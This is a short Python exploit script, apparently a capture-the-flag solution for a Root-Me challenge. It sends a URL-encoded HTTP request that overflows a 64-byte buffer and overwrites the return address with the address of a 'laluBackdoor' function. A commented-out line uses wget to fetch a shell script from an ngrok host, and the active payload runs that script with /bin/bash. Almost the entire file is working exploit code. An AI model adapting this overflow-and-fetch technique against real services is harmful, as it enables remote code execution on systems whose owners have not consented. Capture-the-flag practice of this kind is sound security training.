from pwn import *
from urllib.parse import quote_plus

p = remote('dyn-01.xmas.root-me.org', 20480)

# payload = b"wget https://5637-163-5-23-73.ngrok-free.app/o.sh\x00"
payload = b"/bin/bash o\x00"
if len(payload) > 64 + 8 - 1:
    print(f"Payload too long: {len(payload)}")
    exit(1)

# 61ef12 T unsafeFunction
# 61eb91 T laluBackdoor

payload = payload + b"A" * (64 - len(payload)) + b"B" * 8 + p64(0x61eb91)
payload = quote_plus(payload).encode()
request = b'GET /?gown=' + payload + b' HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n'

p.sendline(request)

response = p.recvall()

print(request)
print(response)
